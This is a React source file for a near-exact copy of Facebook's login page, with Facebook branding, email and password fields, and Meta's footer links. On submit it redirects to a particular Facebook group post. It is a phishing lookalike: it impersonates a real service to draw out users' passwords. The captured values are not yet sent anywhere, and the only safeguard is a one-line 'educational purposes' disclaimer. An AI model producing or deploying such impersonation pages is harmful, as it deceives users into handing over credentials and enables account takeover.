/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { motion } from 'motion/react';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Redirect to the specified URL as requested previously
    window.location.href = 'https://www.facebook.com/groups/962216926490206/posts/962218286490070';
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] font-sans flex flex-col">
      {/* Main Content */}
      <main className="flex-grow flex items-center justify-center px-4 py-12 md:py-24">
        <div className="max-w-[980px] w-full flex flex-col md:flex-row items-center md:items-start justify-between gap-8 md:gap-12">
          
          {/* Left Side: Branding */}
          <div className="flex flex-col items-center md:items-start text-center md:text-left md:pt-12 max-w-[500px]">
            <h1 className="text-[#1877f2] text-[60px] font-bold tracking-tighter -ml-1 mb-2">
              facebook
            </h1>
            <h2 className="text-[24px] md:text-[28px] leading-tight font-normal text-[#1c1e21] px-4 md:px-0">
              Facebook helps you connect and share with the people in your life.
            </h2>
          </div>

          {/* Right Side: Login Form */}
          <div className="w-full max-w-[396px]">
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="bg-white p-4 rounded-lg shadow-xl"
            >
              <form onSubmit={handleSubmit} className="flex flex-col gap-4">
                <input
                  type="text"
                  placeholder="Email address or phone number"
                  className="w-full p-3.5 border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-[17px]"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
                <input
                  type="password"
                  placeholder="Password"
                  className="w-full p-3.5 border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-[17px]"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="submit"
                  className="w-full bg-[#1877f2] text-white py-3 rounded-md text-[20px] font-bold hover:bg-[#166fe5] transition-colors cursor-pointer"
                >
                  Log In
                </button>
                <a href="#" className="text-[#1877f2] text-[14px] text-center hover:underline mt-1">
                  Forgotten password?
                </a>
                <div className="border-b border-[#dadde1] my-2"></div>
                <div className="flex justify-center pt-2 pb-1">
                  <button
                    type="button"
                    className="bg-[#42b72a] text-white px-4 py-3 rounded-md text-[17px] font-bold hover:bg-[#36a420] transition-colors cursor-pointer"
                  >
                    Create new account
                  </button>
                </div>
              </form>
            </motion.div>
            <p className="text-[14px] text-center mt-7">
              <a href="#" className="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
            </p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white pt-8 pb-5 px-4">
        <div className="max-w-[980px] mx-auto text-[#737373] text-[12px]">
          <div className="flex flex-wrap gap-x-3 gap-y-1 mb-2 border-b border-[#dddfe2] pb-2">
            <span className="cursor-default">English (UK)</span>
            <a href="#" className="hover:underline">Bahasa Indonesia</a>
            <a href="#" className="hover:underline">Basa Jawa</a>
            <a href="#" className="hover:underline">Bahasa Melayu</a>
            <a href="#" className="hover:underline">日本語</a>
            <a href="#" className="hover:underline">العربية</a>
            <a href="#" className="hover:underline">Français (France)</a>
            <a href="#" className="hover:underline">Español</a>
            <a href="#" className="hover:underline">Português (Brasil)</a>
            <a href="#" className="hover:underline">Deutsch</a>
            <button className="bg-[#f5f6f7] border border-[#ccd0d5] px-2 rounded-sm hover:bg-[#ebedf0]">+</button>
          </div>
          <div className="flex flex-wrap gap-x-5 gap-y-1 mt-2">
            <a href="#" className="hover:underline">Sign Up</a>
            <a href="#" className="hover:underline">Log In</a>
            <a href="#" className="hover:underline">Messenger</a>
            <a href="#" className="hover:underline">Facebook Lite</a>
            <a href="#" className="hover:underline">Video</a>
            <a href="#" className="hover:underline">Places</a>
            <a href="#" className="hover:underline">Games</a>
            <a href="#" className="hover:underline">Marketplace</a>
            <a href="#" className="hover:underline">Meta Pay</a>
            <a href="#" className="hover:underline">Meta Store</a>
            <a href="#" className="hover:underline">Meta Quest</a>
            <a href="#" className="hover:underline">Meta AI</a>
            <a href="#" className="hover:underline">Instagram</a>
            <a href="#" className="hover:underline">Threads</a>
            <a href="#" className="hover:underline">Fundraisers</a>
            <a href="#" className="hover:underline">Services</a>
            <a href="#" className="hover:underline">Voting Information Centre</a>
            <a href="#" className="hover:underline">Privacy Policy</a>
            <a href="#" className="hover:underline">Privacy Centre</a>
            <a href="#" className="hover:underline">Groups</a>
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Create ad</a>
            <a href="#" className="hover:underline">Create Page</a>
            <a href="#" className="hover:underline">Developers</a>
            <a href="#" className="hover:underline">Careers</a>
            <a href="#" className="hover:underline">Cookies</a>
            <a href="#" className="hover:underline">AdChoices</a>
            <a href="#" className="hover:underline">Terms</a>
            <a href="#" className="hover:underline">Help</a>
            <a href="#" className="hover:underline">Contact uploading and non-users</a>
            <a href="#" className="hover:underline">Settings</a>
            <a href="#" className="hover:underline">Activity log</a>
          </div>
          <div className="mt-5 cursor-default">
            Meta © 2026
          </div>
          <div className="mt-4 text-[#8a8d91] font-medium">
            This website is for educational purposes only.
          </div>
        </div>
      </footer>
    </div>
  );
}
